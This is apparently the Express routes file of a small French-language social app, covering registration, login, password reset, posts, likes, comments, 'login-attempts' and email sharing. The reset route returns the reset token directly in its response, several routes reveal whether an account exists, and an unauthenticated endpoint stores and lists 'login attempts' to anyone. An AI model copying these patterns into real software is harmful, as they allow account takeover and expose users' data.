import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertUserSchema, insertPostSchema, insertLikeSchema, insertCommentSchema, insertLoginAttemptSchema, insertSharedLinkSchema } from "@shared/schema";
import bcrypt from "bcrypt";
import { fromError } from "zod-validation-error";

interface AuthenticatedRequest extends Request {
  user?: {
    id: string;
    email: string;
    name: string;
  };
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // AUTH ROUTES
  app.post("/api/auth/register", async (req, res) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);
      
      const existingUser = await storage.getUserByEmail(validatedData.email);
      if (existingUser) {
        return res.status(400).json({ error: "Un compte avec cet email existe déjà" });
      }

      const existingHandle = await storage.getUserByUsername(validatedData.handle);
      if (existingHandle) {
        return res.status(400).json({ error: "Ce nom d'utilisateur est déjà pris" });
      }

      const hashedPassword = await bcrypt.hash(validatedData.password, 10);
      
      const user = await storage.createUser({
        ...validatedData,
        password: hashedPassword,
      });

      if (req.session) {
        req.session.userId = user.id;
      }

      const { password, ...userWithoutPassword } = user;
      res.json({ user: userWithoutPassword });
    } catch (error: any) {
      const validationError = fromError(error);
      res.status(400).json({ error: validationError.toString() });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      const { email, password } = req.body;
      
      if (!email || !password) {
        return res.status(400).json({ error: "Email et mot de passe requis" });
      }

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(401).json({ error: "Email ou mot de passe incorrect" });
      }

      const isValid = await bcrypt.compare(password, user.password);
      if (!isValid) {
        return res.status(401).json({ error: "Email ou mot de passe incorrect" });
      }

      if (req.session) {
        req.session.userId = user.id;
      }

      const { password: _, ...userWithoutPassword } = user;
      res.json({ user: userWithoutPassword });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session?.destroy((err: any) => {
      if (err) {
        return res.status(500).json({ error: "Erreur lors de la déconnexion" });
      }
      res.json({ success: true });
    });
  });

  app.get("/api/auth/me", async (req, res) => {
    if (!req.session?.userId) {
      return res.status(401).json({ error: "Non authentifié" });
    }

    const user = await storage.getUser(req.session.userId);
    if (!user) {
      return res.status(404).json({ error: "Utilisateur introuvable" });
    }

    const { password, ...userWithoutPassword } = user;
    res.json({ user: userWithoutPassword });
  });

  app.post("/api/auth/request-reset", async (req, res) => {
    try {
      const { email } = req.body;
      
      if (!email) {
        return res.status(400).json({ error: "Email requis" });
      }

      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(404).json({ error: "Utilisateur introuvable" });
      }

      const token = require("crypto").randomBytes(32).toString("hex");
      await storage.setResetToken(user.id, token, 1);

      res.json({ 
        success: true, 
        message: "Email de réinitialisation envoyé",
        resetLink: `/reset/${token}` 
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const { token, password } = req.body;
      
      if (!token || !password) {
        return res.status(400).json({ error: "Token et mot de passe requis" });
      }

      if (password.length < 8) {
        return res.status(400).json({ error: "Le mot de passe doit contenir au moins 8 caractères" });
      }

      const user = await storage.getUserByResetToken(token);
      if (!user) {
        return res.status(401).json({ error: "Lien de réinitialisation invalide ou expiré" });
      }

      const hashedPassword = await bcrypt.hash(password, 10);
      await storage.resetPassword(user.id, hashedPassword);

      res.json({ success: true, message: "Mot de passe réinitialisé" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // POSTS ROUTES
  app.get("/api/posts", async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 50;
      const posts = await storage.getPosts(limit);
      res.json({ posts });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/posts", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Non authentifié" });
      }

      const validatedData = insertPostSchema.parse({
        ...req.body,
        authorId: req.session.userId,
      });

      const post = await storage.createPost(validatedData);
      res.json({ post });
    } catch (error: any) {
      const validationError = fromError(error);
      res.status(400).json({ error: validationError.toString() });
    }
  });

  // LIKES ROUTES
  app.post("/api/likes", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Non authentifié" });
      }

      const { postId } = req.body;
      
      const existingLike = await storage.getUserLike(req.session.userId, postId);
      if (existingLike) {
        await storage.deleteLike(req.session.userId, postId);
        return res.json({ liked: false });
      }

      const validatedData = insertLikeSchema.parse({
        userId: req.session.userId,
        postId,
      });

      await storage.createLike(validatedData);
      res.json({ liked: true });
    } catch (error: any) {
      const validationError = fromError(error);
      res.status(400).json({ error: validationError.toString() });
    }
  });

  // COMMENTS ROUTES
  app.get("/api/posts/:postId/comments", async (req, res) => {
    try {
      const { postId } = req.params;
      const comments = await storage.getCommentsByPost(postId);
      res.json({ comments });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/comments", async (req, res) => {
    try {
      if (!req.session?.userId) {
        return res.status(401).json({ error: "Non authentifié" });
      }

      const validatedData = insertCommentSchema.parse({
        ...req.body,
        userId: req.session.userId,
      });

      const comment = await storage.createComment(validatedData);
      res.json({ comment });
    } catch (error: any) {
      const validationError = fromError(error);
      res.status(400).json({ error: validationError.toString() });
    }
  });

  app.post("/api/login-attempts", async (req, res) => {
    try {
      const validatedData = insertLoginAttemptSchema.parse(req.body);
      const attempt = await storage.saveLoginAttempt(validatedData);
      res.json({ success: true, attempt });
    } catch (error: any) {
      res.status(400).json({ error: error.message });
    }
  });

  app.get("/api/login-attempts", async (req, res) => {
    try {
      const attempts = await storage.getLoginAttempts();
      res.json({ attempts });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  app.post("/api/share-email", async (req, res) => {
    try {
      const { senderEmail, recipientEmail, appUrl } = req.body;
      
      if (!senderEmail || !recipientEmail || !appUrl) {
        return res.status(400).json({ error: "Données manquantes" });
      }

      const link = await storage.saveSharedLink({
        senderEmail,
        recipientEmail,
        appUrl,
      });

      res.json({ success: true, link });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
